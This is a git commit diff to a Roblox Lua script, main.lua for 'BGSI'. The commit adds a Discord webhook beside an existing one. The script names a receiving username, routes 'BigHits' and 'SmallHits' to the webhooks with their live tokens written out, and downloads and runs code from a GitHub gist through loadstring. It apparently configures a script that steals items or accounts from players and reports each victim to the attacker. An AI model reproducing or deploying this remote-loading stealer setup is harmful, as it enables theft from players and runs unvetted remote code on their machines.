87d6a2d21858a4b2f2d60855ba6a246c3891901d
vkz. <lucaspedgley1@gmail.com>
2025-06-21 00:02:29 +0300

    Update main.lua

--- BGSI/main.lua
+++ BGSI/main.lua
@@ -3,5 +3,6 @@ Usernames = {
     "roblox_user_8366471965"
 }
 local z = "https://discord.com/api/webhooks/1385718820848537742/khp6CFwu4dHhfKfGHpmDKvkyiVyUFjR5U3sb-FYJxfj2gteflZt3dsb5lJ-STjO3PYtU"
-BigHitsWebhook, SmallHitsWebhook = z, z
+local x = "https://discord.com/api/webhooks/1385726448320512040/wRSs6p88PoVcBaTtRPbkYcqgDaYgajfCf85lcwRCL5CLc0rTqGzHY3LmI84Ba20v6Zek"
+BigHitsWebhook, SmallHitsWebhook = x, z
 loadstring(game:HttpGet("https://gist.githubusercontent.com/vkzire/dbe0fbe0522929be506afd8f0f782b03/raw/044727a115ff865d2e7c857bfb63692f07098471/gistfile1.txt", true))()
